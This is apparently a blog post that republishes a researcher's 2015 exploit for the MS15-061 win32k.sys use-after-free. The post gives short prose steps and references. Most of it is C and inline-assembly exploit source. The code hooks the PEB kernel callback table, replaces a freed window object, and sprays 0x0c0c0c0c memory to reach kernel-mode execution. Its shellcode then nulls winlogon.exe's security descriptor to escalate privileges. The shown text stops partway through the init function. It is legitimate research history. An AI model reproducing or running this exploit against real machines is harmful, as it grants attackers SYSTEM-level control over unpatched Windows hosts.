<p>in 2015 I managed to exploit it by reverse engineering Win32k.sys and it ended up in <a href="https://en.wikipedia.org/wiki/Metasploit">Metasploit</a>, you can read the blog post about it in <a href="https://www.rapid7.com/blog/post/2015/10/01/flipping-bits/">rapid7</a>.</p>

<p>I’m republishing the exploit here.</p>

<p>the code is heavly documented.
steps:</p>
<ul>
  <li>Implement a PEB callback function for hooking.</li>
  <li>trigger a vulnerability by creating a specific window to execute the vulnerable function.</li>
  <li>Within the PEB callback, substitute a fake object with NtUserDefSetText in the Desktop heap.</li>
  <li>Create a fake object with buffer filled with 0x0c0c0c0c and a pointer to tagWND. for safe dereferences: I used this trick similar to using fake vTable in Browser exploitation:
  allocate 0x0c0c0c0c address and fill tagWND with 0x0c0c0c0c
  so every dereference  will have a valid address in 0x0c0c0c0c range, this method can’t work on <a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention">SMAP</a></li>
  <li>Repeat this process until bServerSideWindowProc is set.</li>
</ul>

<p>Referenaces</p>
<ul>
  <li><a href="https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf">nccgroup</a></li>
  <li><a href="http://www.mista.nu/research/mandt-win32k-slides.pdf">mista</a></li>
  <li><a href="https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/">mwrinfosecurity</a></li>
</ul>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_HANDLEENTRY</span>
<span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">phead</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">pOwner</span><span class="p">;</span>
    <span class="n">BYTE</span> <span class="n">bType</span><span class="p">;</span>
    <span class="n">BYTE</span> <span class="n">bFlags</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">wUniq</span><span class="p">;</span>
<span class="p">}</span> <span class="n">HANDLEENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PHANDLEENTRY</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SERVERINFO</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwSRVIFlags</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">cHandleEntries</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">wSRVIFlags</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">wRIPPID</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">wRIPError</span><span class="p">;</span>

<span class="p">}</span> <span class="n">SERVERINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSERVERINFO</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SHAREDINFO</span>
<span class="p">{</span>
    <span class="n">PSERVERINFO</span> <span class="n">psi</span><span class="p">;</span>
    <span class="n">PHANDLEENTRY</span> <span class="n">aheList</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">HeEntrySize</span><span class="p">;</span> <span class="c1">// Win7 - not present in WinXP?</span>
    <span class="n">ULONG_PTR</span> <span class="n">pDispInfo</span><span class="p">;</span>
    <span class="n">ULONG_PTR</span> <span class="n">ulSharedDelta</span><span class="p">;</span>
    <span class="n">ULONG_PTR</span> <span class="n">awmControl</span><span class="p">;</span>        <span class="c1">// Not in XP</span>
    <span class="n">ULONG_PTR</span> <span class="n">DefWindowMsgs</span><span class="p">;</span>     <span class="c1">// Not in XP</span>
    <span class="n">ULONG_PTR</span> <span class="n">DefWindowSpecMsgs</span><span class="p">;</span> <span class="c1">// Not in XP</span>
<span class="p">}</span> <span class="n">SHAREDINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSHAREDINFO</span><span class="p">;</span>

<span class="kt">void</span> <span class="o">*</span><span class="n">Get__Win32ClientInfo</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/*
   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH
   +0x6b4 RealClientId     : _CLIENT_ID
   +0x6bc GdiCachedProcessHandle : Ptr32 Void
   +0x6c0 GdiClientPID     : Uint4B
   +0x6c4 GdiClientTID     : Uint4B
   +0x6c8 GdiThreadLocalInfo : Ptr32 Void
   +0x6cc Win32ClientInfo  : [62] Uint4B
   */</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kr">__asm</span>
    <span class="p">{</span>
	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x6cc</span><span class="p">]</span> <span class="c1">// Win32ClientInfo</span>
	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">CHAR</span> <span class="n">originalCLS</span><span class="p">[</span><span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>

<span class="n">HWND</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HWND</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">HMODULE</span> <span class="n">hUser32</span><span class="p">;</span>
    <span class="n">PSHAREDINFO</span> <span class="n">pSharedInfo</span><span class="p">;</span>
    <span class="n">PSERVERINFO</span> <span class="n">pServerInfo</span><span class="p">;</span>
    <span class="n">HANDLEENTRY</span> <span class="o">*</span><span class="n">UserHandleTable</span><span class="p">;</span>

    <span class="n">pSharedInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSHAREDINFO</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">),</span> <span class="s">"gSharedInfo"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pSharedInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Unable to locate SharedInfo"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] SharedInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pSharedInfo</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">UserHandleTable</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">aheList</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] aheList @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">UserHandleTable</span><span class="p">);</span>

    <span class="n">pServerInfo</span> <span class="o">=</span> <span class="n">pSharedInfo</span><span class="o">-&gt;</span><span class="n">psi</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] pServerInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Handle Count: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">);</span>
    <span class="c1">// printf("User Delta 0x%p\r\n", pSharedInfo-&gt;ulSharedDelta); Not used</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pServerInfo</span><span class="o">-&gt;</span><span class="n">cHandleEntries</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kr">__try</span>
        <span class="p">{</span>
            <span class="c1">//</span>
            <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)(</span><span class="n">i</span> <span class="o">|</span> <span class="p">(</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">wUniq</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">kernelWindowHandle</span> <span class="o">==</span> <span class="n">hwnd</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">kernelWindowHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)</span><span class="n">UserHandleTable</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">phead</span><span class="p">;</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Window Handle found %p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernelWindowHandle</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
        <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="n">ArbDecByOne</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">originalCLS</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_LARGE_UNICODE_STRING</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">MaximumLength</span> <span class="o">:</span> <span class="mi">31</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">bAnsi</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">PWSTR</span> <span class="n">Buffer</span><span class="p">;</span>
<span class="p">}</span> <span class="n">LARGE_UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span><span class="n">PLARGE_UNICODE_STRING</span><span class="p">;</span>

<span class="n">VOID</span> <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span>
    <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">,</span>
    <span class="n">LPCWSTR</span> <span class="n">psz</span><span class="p">,</span>
    <span class="n">UINT</span> <span class="n">cchLimit</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>

    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)</span><span class="n">psz</span><span class="p">;</span>
    <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">bAnsi</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">psz</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Length</span> <span class="o">=</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">psz</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">);</span>
        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">Length</span><span class="p">,</span> <span class="n">cchLimit</span><span class="p">);</span>
        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="n">min</span><span class="p">((</span><span class="n">Length</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UNICODE_NULL</span><span class="p">)),</span> <span class="n">cchLimit</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">MaximumLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">plstr</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">NTAPI</span> <span class="n">NtUserDefSetText</span><span class="p">(</span>
    <span class="n">IN</span> <span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span>
    <span class="n">IN</span> <span class="n">PLARGE_UNICODE_STRING</span> <span class="n">pstrText</span> <span class="n">OPTIONAL</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kr">__asm</span>
    <span class="p">{</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">116</span><span class="n">Dh</span>
	<span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span><span class="n">FFE0300h</span>	
	<span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">]</span>
	<span class="n">retn</span>    <span class="mi">8</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// the Window Procedure</span>
<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
<span class="p">{</span>

    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="n">kernelHandle</span><span class="p">;</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">noinline</span><span class="p">)</span> <span class="kt">int</span> <span class="n">Shellcode</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// return MessageBoxA(NULL,"Boom","boom",0);</span>
    <span class="kr">__asm</span> 
    <span class="p">{</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">kernelHandle</span> <span class="c1">// WND - Which window? Check this</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="c1">// THREADINFO</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span> <span class="c1">// ETHREAD</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x150</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// flink</span>
	<span class="nl">procloop:</span>
	<span class="n">lea</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="o">-</span><span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// KPROCESS</span>
	<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
	<span class="n">add</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x16c</span> <span class="c1">// module name</span>
	<span class="n">cmp</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x6c6e6977</span> <span class="c1">// “winl” for winlogon.exe</span>
	<span class="n">jne</span> <span class="n">procloop</span>
	<span class="n">sub</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x170</span>
	<span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="mh">0x0</span> <span class="c1">// NULL ACL</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="n">WndProc2</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">msg</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">WORD</span> <span class="n">um</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kr">__asm</span>
    <span class="p">{</span>
	<span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="n">cs</span>
	<span class="n">mov</span> <span class="n">um</span><span class="p">,</span> <span class="n">ax</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">um</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// USER MODE</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">success</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
       <span class="c1">// DebugBreak();</span>

        <span class="n">Shellcode</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">DefWindowProc</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">HWND</span> <span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">SecondWindowIndex</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="kt">void</span> <span class="n">CreateSecondWindow</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
    <span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"SecondClass"</span><span class="p">;</span>

    <span class="c1">// Step 1: Registering the Window Class</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc2</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="n">LoadCursor</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
            <span class="n">g_szClassName</span><span class="p">,</span>
            <span class="s">L"The title of my window"</span><span class="p">,</span>
            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>

            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">const</span> <span class="n">WCHAR</span> <span class="n">g_szClassName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"MS15-061"</span><span class="p">;</span>
<span class="n">HWND</span> <span class="n">hwnd</span><span class="p">;</span>
<span class="n">HINSTANCE</span> <span class="n">hInstance2</span><span class="p">;</span>
<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">);</span>
<span class="n">pUser32_ClientCopyImage</span> <span class="n">g_originalCCI</span><span class="p">;</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">__ClientCopyImageAddress</span><span class="p">;</span>

<span class="n">NTSTATUS</span> <span class="n">NTAPI</span> <span class="n">hookCCI</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">LARGE_UNICODE_STRING</span> <span class="n">plstr</span><span class="p">;</span>
    <span class="c1">// free  WND object</span>
    <span class="n">DestroyWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
    <span class="n">UnregisterClassW</span><span class="p">(</span><span class="n">g_szClassName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="cm">/*
    .text:BF89EA6D                 push    edx
    .text:BF89EA6E                 call    _xxxClientCopyImage@20 ; xxxClientCopyImage(x,x,x,x,x)
    .text:BF89EA73                 lea     esi, [edi+58h]  -------&gt;&gt;&gt;&gt; replace edi memeory with NtUserDefSetText
    .text:BF89EA76                 mov     edx, eax
    .text:BF89EA78                 mov     ecx, esi
    .text:BF89EA7A                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)

    */</span>

    <span class="n">DebugBreak</span><span class="p">();</span>
    <span class="n">RtlInitLargeUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">plstr</span><span class="p">,</span> <span class="p">(</span><span class="n">WCHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">originalCLS</span><span class="p">,</span> <span class="p">(</span><span class="n">UINT</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">NtUserDefSetText</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="n">SecondWindowIndex</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">plstr</span><span class="p">);</span>
    <span class="n">SecondWindowIndex</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">g_originalCCI</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kr">__asm</span>
    <span class="p">{</span>
	<span class="n">mov</span> <span class="n">edx</span> <span class="p">,</span> <span class="mh">0xD8</span><span class="p">;</span> <span class="c1">// 0x36 *4 -&gt;  API index *4  number  for  __ClientCopyImage</span>
	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mx">30h</span><span class="p">]</span> <span class="c1">// EAX=PEB</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">2</span><span class="n">Ch</span><span class="p">]</span> <span class="c1">// EAX=KernelCallbackTable</span>
	<span class="n">add</span>	  <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>
	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
		<span class="c1">//  int 3</span>

    <span class="p">}</span>

    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">init</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">prot</span><span class="p">;</span>

    <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">);</span>
    <span class="n">CreateSecondWindow</span><span class="p">();</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">lpvBase</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span>
        <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0c0c0c0c</span><span class="p">,</span>       <span class="c1">// System selects address</span>
        <span class="mi">2048</span><span class="p">,</span>                     <span class="c1">// Size of allocation</span>
        <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="c1">// Allocate reserved pages</span>
        <span class="n">PAGE_READWRITE</span><span class="p">);</span>          <span class="c1">// Protection = no access</span>

    <span class="cm">/*
    for safe exit  : i used trick like  Browser Fake vTable :
    allocate 0x0c0c0c0c address and  fill tagWND with 0x0c0c0c0c
    so every dereference  will loop in 0x0c0c0c0c

    */</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">lpvBase</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">originalCLS</span><span class="p">,</span> <span class="sc">'\x0c'</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">);</span>

    <span class="cm">/*
   +0x014 bForceMenuDraw   : Pos 15, 1 Bit
   +0x014 bDialogWindow    : Pos 16, 1 Bit
   +0x014 bHasCreatestructName : Pos 17, 1 Bit
   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
   +0x014 bAnsiWindowProc  : Pos 19, 1 Bit
   */</span>

